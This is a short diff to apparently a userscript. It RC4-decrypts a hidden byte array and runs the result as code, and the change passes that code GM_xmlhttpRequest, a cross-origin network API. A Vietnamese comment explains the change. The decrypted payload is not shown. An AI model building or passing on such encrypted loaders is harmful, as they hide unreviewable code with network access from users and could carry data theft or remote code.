@@ -31,5 +31,6 @@
   const decryptedBytes = rc4Bytes(key, rawBytes);
   const decoded = new TextDecoder("utf-8").decode(new Uint8Array(decryptedBytes));
 
-  Function(decoded)();
+  // ⚠️ Truyền GM_xmlhttpRequest vào để dùng được sau mã hóa
+  (new Function("GM_xmlhttpRequest", decoded))(GM_xmlhttpRequest);
 })();
